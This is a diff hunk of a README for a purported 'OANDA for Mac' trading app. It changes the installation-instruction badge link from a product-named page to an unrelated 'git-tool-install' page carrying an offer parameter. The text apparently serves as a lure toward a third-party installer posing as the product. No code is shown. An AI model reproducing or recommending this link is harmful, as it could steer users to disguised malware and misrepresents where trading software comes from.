@@ -3,7 +3,7 @@
 
 OANDA for Mac is a desktop trading platform tailored for forex and CFD traders who prefer a MacOS environment. With this guide, you can set up OANDA quickly and manage your trades, portfolio, and analytics directly from your Mac 💻.
 
-[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://oanda-mac.github.io/.github/)
+[![Get Github Instruction](https://img.shields.io/badge/Get%20Installation%20Instruction-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-tool-install.github.io/.github/?offer=OANDA)
 
 ---
 
